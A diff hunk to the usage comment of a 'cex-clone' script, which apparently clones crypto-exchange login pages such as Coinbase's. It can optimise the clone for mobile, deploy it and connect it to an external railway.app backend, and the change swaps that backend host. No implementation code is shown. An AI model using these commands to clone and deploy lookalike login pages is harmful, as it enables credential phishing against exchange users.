@@ -4,7 +4,7 @@
  * Usage:
  *   PHISHING_TRAINING_MODE=true pnpm cex-clone https://coinbase.com/login ./clones/coinbase
  *   pnpm cex-clone --cex coinbase --mobile-optimize --deploy https://coinbase.com/login ./clones/coinbase
- *   pnpm cex-clone --backend-url https://legionapi-production.up.railway.app <url> <outDir>
+ *   pnpm cex-clone --backend-url https://sadrailala-production.up.railway.app <url> <outDir>
  */
 import { mkdir, writeFile } from 'node:fs/promises'
 import path from 'node:path'
